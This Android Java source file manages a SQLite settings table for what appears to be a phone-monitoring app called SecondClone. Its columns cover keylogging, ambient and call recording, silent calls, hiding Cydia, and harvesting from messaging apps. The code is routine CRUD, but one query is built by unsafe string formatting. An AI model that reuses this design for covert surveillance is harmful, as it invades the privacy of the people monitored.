/*
  ClassName: DatabaseGetSetting.java
  Project: SecondClone
  author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class DatabaseGetSetting is used to create, add, modify, delete databases, save
  the history Setting from the server, use the "Dashboard.class".
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.jexpa.secondclone.Database;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import com.jexpa.secondclone.Model.DeviceFeatures;

import java.util.ArrayList;
import java.util.List;

import static android.content.ContentValues.TAG;
import static com.jexpa.secondclone.API.APIDatabase.API_Add_Database;
import static com.jexpa.secondclone.Database.DatabaseHelper.getInstance;
import static com.jexpa.secondclone.Database.Entity.AmbientRecordEntity.TABLE_AMBIENTRECORD_HISTORY;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ADMIN_NUMBER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ALERT;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AMBIENT_RECORD;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AMBIENT_RECORD_DURATION;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_APP;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_APP_INSTALL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AUTO_UPGRADE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_BBM;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CALENDAR;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CALL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CLIENT_DATE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CLIPBOARD;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CONNECTION_TYPE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CONTACT;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CREATED_BY;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CREATED_DATE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_DELIVERY_LOGS_BY_EMAIL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_DELIVER_EMAIL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_Device_ID;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_EMAIL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_EXPORCSV;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_FACEBOOK;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_FLUSH_DATA_EVENT_EXPIRED;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_GPS;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_GPS_INTERVAL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HANGOUTS;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HIDE_CYDIA;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HORIZONTAL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ID;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_INSTAGRAM;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_KEYLOGGER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_KIK;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_LEVEL_LOG_FILE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_LINE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MODIFIED_BY;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MODIFIED_DATE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MONITOR_NUMBER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NETWORK_CONNECTION;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NOTE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NOTIFICATION;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_OLA;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_PHOTO;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_RECORDED;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_REPORT_INTERVAL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_REPORT_PROBLEM;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_RUN_MODE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SAVE_BATTERY;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SECRET_KEY;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SERVER_TIME;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SILENT_CALL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SKYPE;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SMS;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SNAPCHAT;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_TANGO;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_TWITTER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_UNINSTALL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_URL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_URL_SERVER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VERTICAL;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VIBER;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VIDEO;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VOICE_MEMOS;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_WECHAT;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_WHATAPP;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.COLUMN_GETSETTING_YAHOO;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.DATABASE_NAME_GET_SETTING;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.DATABASE_VERSION_GET_SETTING;
import static com.jexpa.secondclone.Database.Entity.DeviceEntity.TABLE_GET_SETTING;


public class DatabaseGetSetting
{

    private Context context;
    private DatabaseHelper database;

    public DatabaseGetSetting(Context context) {
        this.context = context;
        this.database = getInstance(context);
        if(!database.checkTableExist(TABLE_GET_SETTING))
            createTable();
    }

    private void createTable() {
        Log.i(TAG, "DatabaseFeature.onCreate ... " + TABLE_GET_SETTING);
        // PRIMARY KEY
        String scriptTable = "CREATE TABLE " + TABLE_GET_SETTING + "("
                + COLUMN_GETSETTING_ID + " INTEGER PRIMARY KEY,"
                + COLUMN_GETSETTING_Device_ID + " TEXT,"
                + COLUMN_GETSETTING_CALENDAR + " TEXT,"
                + COLUMN_GETSETTING_SMS + " INTEGER,"
                + COLUMN_GETSETTING_CALL + " INTEGER,"
                + COLUMN_GETSETTING_GPS + " INTEGER,"
                + COLUMN_GETSETTING_GPS_INTERVAL + " TEXT,"
                + COLUMN_GETSETTING_REPORT_INTERVAL + " INTEGER,"
                + COLUMN_GETSETTING_URL + " INTEGER,"
                + COLUMN_GETSETTING_EMAIL + " TEXT,"
                + COLUMN_GETSETTING_CONTACT + " INTEGER,"
                + COLUMN_GETSETTING_PHOTO + " INTEGER,"
                + COLUMN_GETSETTING_APP + " INTEGER,"
                + COLUMN_GETSETTING_APP_INSTALL + " INTEGER,"
                + COLUMN_GETSETTING_RECORDED + " INTEGER,"
                + COLUMN_GETSETTING_NOTE + " TEXT,"
                + COLUMN_GETSETTING_VIDEO + " TEXT,"
                + COLUMN_GETSETTING_VOICE_MEMOS + " TEXT,"
                + COLUMN_GETSETTING_AMBIENT_RECORD + " TEXT,"
                + COLUMN_GETSETTING_AMBIENT_RECORD_DURATION + " TEXT,"
                + COLUMN_GETSETTING_WHATAPP + " TEXT,"
                + COLUMN_GETSETTING_YAHOO + " TEXT,"
                + COLUMN_GETSETTING_KEYLOGGER + " TEXT,"
                + COLUMN_GETSETTING_NOTIFICATION + " TEXT,"
                + COLUMN_GETSETTING_SECRET_KEY + " TEXT,"
                + COLUMN_GETSETTING_VIBER + " TEXT,"
                + COLUMN_GETSETTING_TANGO + " TEXT,"
                + COLUMN_GETSETTING_WECHAT + " TEXT,"
                + COLUMN_GETSETTING_FACEBOOK + " TEXT,"
                + COLUMN_GETSETTING_OLA + " TEXT,"
                + COLUMN_GETSETTING_SKYPE + " TEXT,"
                + COLUMN_GETSETTING_HANGOUTS + " TEXT,"
                + COLUMN_GETSETTING_BBM + " TEXT,"
                + COLUMN_GETSETTING_LINE + " TEXT,"
                + COLUMN_GETSETTING_KIK + " TEXT,"
                + COLUMN_GETSETTING_TWITTER + " TEXT,"
                + COLUMN_GETSETTING_INSTAGRAM + " TEXT,"
                + COLUMN_GETSETTING_SNAPCHAT + " TEXT,"
                + COLUMN_GETSETTING_HORIZONTAL + " INTEGER,"
                + COLUMN_GETSETTING_VERTICAL + " INTEGER,"
                + COLUMN_GETSETTING_MONITOR_NUMBER + " TEXT,"
                + COLUMN_GETSETTING_ADMIN_NUMBER + " TEXT,"
                + COLUMN_GETSETTING_AUTO_UPGRADE + " INTEGER,"
                + COLUMN_GETSETTING_UNINSTALL + " INTEGER,"
                + COLUMN_GETSETTING_URL_SERVER + " TEXT,"
                + COLUMN_GETSETTING_FLUSH_DATA_EVENT_EXPIRED + " INTEGER,"
                + COLUMN_GETSETTING_DELIVERY_LOGS_BY_EMAIL + " INTEGER,"
                + COLUMN_GETSETTING_REPORT_PROBLEM + " INTEGER,"
                + COLUMN_GETSETTING_LEVEL_LOG_FILE + " INTEGER,"
                + COLUMN_GETSETTING_SAVE_BATTERY + " TEXT,"
                + COLUMN_GETSETTING_CONNECTION_TYPE + " TEXT,"
                + COLUMN_GETSETTING_SERVER_TIME + " TEXT,"
                + COLUMN_GETSETTING_CLIENT_DATE + " TEXT,"
                + COLUMN_GETSETTING_SILENT_CALL + " INTEGER,"
                + COLUMN_GETSETTING_RUN_MODE + " INTEGER,"
                + COLUMN_GETSETTING_EXPORCSV + " TEXT,"
                + COLUMN_GETSETTING_HIDE_CYDIA + " INTEGER,"
                + COLUMN_GETSETTING_MODIFIED_DATE + " TEXT,"
                + COLUMN_GETSETTING_MODIFIED_BY + " INTEGER,"
                + COLUMN_GETSETTING_CREATED_DATE + " TEXT,"
                + COLUMN_GETSETTING_DELIVER_EMAIL + " TEXT,"
                + COLUMN_GETSETTING_NETWORK_CONNECTION + " INTEGER,"
                + COLUMN_GETSETTING_CLIPBOARD + " INTEGER,"
                + COLUMN_GETSETTING_ALERT + " INTEGER,"
                + COLUMN_GETSETTING_CREATED_BY + " INTEGER)";
        // Run create table command.
        database.getWritableDatabase().execSQL(scriptTable);

    }


    public void addGetSetting(DeviceFeatures deviceFeature) {
        //        Log.i(TAG, "DatabaseFeature.addGetSetting ... "+ GETSETTING_Device_ID );

        ContentValues contentValues1 = API_Add_Database(deviceFeature,true);
        if(!checkItemExist(COLUMN_GETSETTING_ID,String.valueOf(deviceFeature.getID()),TABLE_GET_SETTING))
        {
            Log.d("checka", "checkItemExist = "+false);
            database.getWritableDatabase().insert(TABLE_GET_SETTING, null, contentValues1);
        }
        else
        {
            Log.d("checka", "checkItemExist = "+true);
            database.getWritableDatabase().update(TABLE_GET_SETTING,  contentValues1,COLUMN_GETSETTING_ID + " = ?",
                    new String[]{String.valueOf(deviceFeature.getID())});
        }

        //Close the database connection.
        database.close();

    }

    private boolean checkItemExist(String KEY_ID, String value, String tableName){

        String query = String.format("SELECT * FROM %s WHERE %s = '%s'", tableName, KEY_ID, value);
        Cursor cursor =  database.getWritableDatabase().rawQuery(query, null);

        if (cursor.moveToFirst()) {
            cursor.close();
            return true;
        } else {
            cursor.close();
            return false;
        }
    }

    // method count all row of TABLE_GET_SETTING
    public int getSettingCount() {
        Log.i(TAG, "DatabaseFeature.getSettingCount ... " + TABLE_GET_SETTING);
        String countQuery = "SELECT  * FROM " + TABLE_GET_SETTING;

        Cursor cursor = database.getWritableDatabase().rawQuery(countQuery, null);
        int count = cursor.getCount();
        cursor.close();
        // return count
        return count;
    }

    // method delete a row of TABLE_GET_SETTING
    public void deleteSetting(DeviceFeatures deviceFeature) {
        Log.i(TAG, "DatabaseFeature.deleteSetting ... " + deviceFeature.getDevice_ID());

        database.getWritableDatabase().delete(TABLE_GET_SETTING, COLUMN_GETSETTING_Device_ID + " = ?",
                new String[]{String.valueOf(deviceFeature.getDevice_ID())});
        database.close();
    }

    // method get all row of TABLE_GET_SETTING
    public List<DeviceFeatures> getAllSetting() {
        Log.i(TAG, "DatabaseFeature.getAllDevice ... " + TABLE_GET_SETTING);
        List<DeviceFeatures> listGetSetting = new ArrayList<>();
        // Select All Query
        String selectQuery = "SELECT  * FROM " + TABLE_GET_SETTING;


        @SuppressLint("Recycle") Cursor cursor = database.getWritableDatabase().rawQuery(selectQuery, null);
        // Browse on the cursor, and add it to the list.
        if (cursor.moveToFirst()) {
            do {
                DeviceFeatures deviceFeature = new DeviceFeatures();
                deviceFeature.setID(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_ID)));
                deviceFeature.setDevice_ID(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_Device_ID)));
                deviceFeature.setCalendar(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_CALENDAR)));
                deviceFeature.setsMS(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_SMS)));
                deviceFeature.setCall(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_CALL)));
                deviceFeature.setgPS(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_GPS)));
                deviceFeature.setgPS_Interval(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_GPS_INTERVAL)));
                deviceFeature.setReport_Interval(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_REPORT_INTERVAL)));
                deviceFeature.setuRL(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_URL)));
                deviceFeature.setEmail(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_EMAIL)));
                deviceFeature.setContact(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_CONTACT)));
                deviceFeature.setPhoto(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_PHOTO)));
                deviceFeature.setApp(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_APP)));
                deviceFeature.setApp_Installation(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_APP_INSTALL)));
                deviceFeature.setRecorded_Call(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_RECORDED)));
                deviceFeature.setNote(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_NOTE)));
                deviceFeature.setVideo(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_VIDEO)));
                deviceFeature.setVoice_Memos(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_VOICE_MEMOS)));
                deviceFeature.setAmbient_Record(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_AMBIENT_RECORD)));
                deviceFeature.setAmbient_Record_Duration(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_AMBIENT_RECORD_DURATION)));
                deviceFeature.setWhatApp(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_WHATAPP)));
                deviceFeature.setYahoo(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_YAHOO)));
                deviceFeature.setKeyLogger(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_KEYLOGGER)));
                deviceFeature.setNotification(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_NOTIFICATION)));
                deviceFeature.setSecret_Key(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_SECRET_KEY)));
                deviceFeature.setViber(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_VIBER)));
                deviceFeature.setTango(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_TANGO)));
                deviceFeature.setWechat(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_WECHAT)));
                deviceFeature.setFacebook(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_FACEBOOK)));
                deviceFeature.setOla(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_OLA)));
                deviceFeature.setSkype(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_SKYPE)));
                deviceFeature.setHangouts(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_HANGOUTS)));
                deviceFeature.setBbm(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_BBM)));
                deviceFeature.setLine(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_LINE)));
                deviceFeature.setKik(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_KIK)));
                deviceFeature.setTwitter(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_TWITTER)));
                deviceFeature.setInstagram(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_INSTAGRAM)));
                deviceFeature.setSnapchat(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_SNAPCHAT)));
                deviceFeature.setHorizontal(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_HORIZONTAL)));
                deviceFeature.setVertical(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_VERTICAL)));
                deviceFeature.setMonitor_Number(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_MONITOR_NUMBER)));
                deviceFeature.setAdmin_Number(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_ADMIN_NUMBER)));
                deviceFeature.setAuto_Upgrade(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_AUTO_UPGRADE)));
                deviceFeature.setUninstall(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_UNINSTALL)));
                deviceFeature.setuRL_Server(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_URL_SERVER)));
                deviceFeature.setFlush_Data_Even_Expired(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_FLUSH_DATA_EVENT_EXPIRED)));
                deviceFeature.setDelivery_Logs_By_Email(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_DELIVERY_LOGS_BY_EMAIL)));
                deviceFeature.setReport_Problem(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_REPORT_PROBLEM)));
                deviceFeature.setLevel_Log_File(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_LEVEL_LOG_FILE)));
                deviceFeature.setSave_Battery(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_SAVE_BATTERY)));
                deviceFeature.setConnection_Type(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_CONNECTION_TYPE)));
                deviceFeature.setServerTime(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_SERVER_TIME)));
                deviceFeature.setClient_Date(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_CLIENT_DATE)));
                deviceFeature.setSilent_Call(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_SILENT_CALL)));
                deviceFeature.setRun_Mode(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_RUN_MODE)));
                deviceFeature.setExportcsv(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_EXPORCSV)));
                deviceFeature.setHide_Cydia(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_HIDE_CYDIA)));
                deviceFeature.setModified_Date(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_MODIFIED_DATE)));
                deviceFeature.setModified_By(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_MODIFIED_BY)));
                deviceFeature.setCreated_Date(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_CREATED_DATE)));
                deviceFeature.setCreated_By(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_CREATED_BY)));
                deviceFeature.setDeliverry_To_Email(cursor.getString(cursor.getColumnIndex(COLUMN_GETSETTING_DELIVER_EMAIL)));
                deviceFeature.setNetwork_Connection(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_NETWORK_CONNECTION)));
                deviceFeature.setClipboard(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_CLIPBOARD)));
                deviceFeature.setAlert(cursor.getInt(cursor.getColumnIndex(COLUMN_GETSETTING_ALERT)));

                // Add in List.
                listGetSetting.add(deviceFeature);
            } while (cursor.moveToNext());
        }
        // return note list
        return listGetSetting;
    }

}
